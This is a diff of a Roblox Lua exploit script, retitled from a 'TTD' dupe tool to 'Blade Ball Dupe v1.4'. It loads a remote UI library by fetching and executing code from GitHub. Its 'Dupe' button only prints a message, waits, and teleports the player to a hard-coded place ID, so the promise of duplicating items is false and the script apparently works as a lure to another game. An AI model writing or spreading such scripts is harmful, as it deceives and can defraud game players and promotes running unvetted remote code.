@@ -1,9 +1,9 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Custom TTD Dupe Script", "DarkTheme")
+local Window = Library.CreateLib("Blade Ball Dupe v1.4", "DarkTheme")
 
 --main
 local Main = Window:NewTab("Main")
-local MainSection = Main:NewSection("Custom TTD Dupe Script")
+local MainSection = Main:NewSection("BB Dupe v1.4")
 
 MainSection:NewToggle("Dupe Delay", "REQUIRED TO DUPE ITEMS", function(state)
     if state then
@@ -27,8 +27,8 @@ end)
 
 MainSection:NewButton("Dupe", "WILL TAKE 1 - 10 MINUTES", function()
     print("Duping Items. Please wait")
-    wait(600)
-    game:GetService("TeleportService"):Teleport(13775256536)
+    wait(60)
+    game:GetService("TeleportService"):Teleport(13772394625)
 end)
 
 getgenv().gui = false
